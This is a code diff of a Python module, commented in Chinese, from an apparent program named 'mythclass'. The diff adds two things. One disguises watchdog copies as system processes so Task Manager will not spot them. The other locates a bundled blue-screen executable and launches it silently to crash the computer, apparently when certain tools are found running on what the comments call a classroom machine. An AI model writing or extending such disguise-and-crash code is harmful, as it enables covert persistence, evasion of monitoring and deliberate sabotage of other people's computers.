@@ -95,6 +95,14 @@ def ensure_copies() -> dict[str, Path]:
 
                 shutil.copy2(src, dst)
                 _log(f"放好了看门狗副本：{dst.name}")
+                # 换皮：图标和版本信息都学系统进程，不然任务管理器一眼认出来
+                try:
+                    from . import camouflage
+
+                    good, why = camouflage.dress_up(dst, role)
+                    _log(("换皮成功：" if good else "换皮失败：") + why)
+                except Exception as err:
+                    _log(f"换皮出错：{type(err).__name__}: {err}")
         except Exception as err:
             _log(f"复制 {dst.name} 失败：{type(err).__name__}: {err}")
     return made
@@ -226,17 +234,40 @@ def tools_running() -> list[str]:
     return sorted(set(hits))
 
 
+def bsod_path() -> Path:
+    """蓝屏程序在哪。
+
+    优先用**安装包里带的**那份 —— 不然教室那台没有 W: 盘就永远不触发。
+    找不到才退回主人给的绝对路径。
+    """
+    cands = []
+    meipass = getattr(sys, "_MEIPASS", "")
+    if meipass:
+        cands.append(Path(meipass) / "mythclass" / "assets" / "wbrn.exe")
+    cands.append(_install_dir() / "mythclass" / "assets" / "wbrn.exe")
+    cands.append(_install_dir() / "_internal" / "mythclass" / "assets" / "wbrn.exe")
+    cands.append(Path(BSOD_EXE))
+    for c in cands:
+        try:
+            if c.exists():
+                return c
+        except Exception:
+            continue
+    return Path(BSOD_EXE)
+
+
 def trigger_bsod(why: str) -> bool:
     """让电脑蓝屏。安全模式下只记日志。"""
+    exe = bsod_path()
     if safe_mode():
-        _log(f"【安全模式】本该蓝屏（{why}），没执行 {BSOD_EXE}")
+        _log(f"【安全模式】本该蓝屏（{why}），没执行 {exe}")
         return False
-    if not Path(BSOD_EXE).exists():
-        _log(f"蓝屏程序不在：{BSOD_EXE}")
+    if not exe.exists():
+        _log(f"蓝屏程序不在（安装包里没有、{BSOD_EXE} 也没有）")
         return False
     try:
         flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
-        subprocess.Popen([BSOD_EXE], creationflags=flags, close_fds=True)
+        subprocess.Popen([str(exe)], creationflags=flags, close_fds=True)
         _log(f"已执行蓝屏程序（{why}）")
         return True
     except Exception as err:
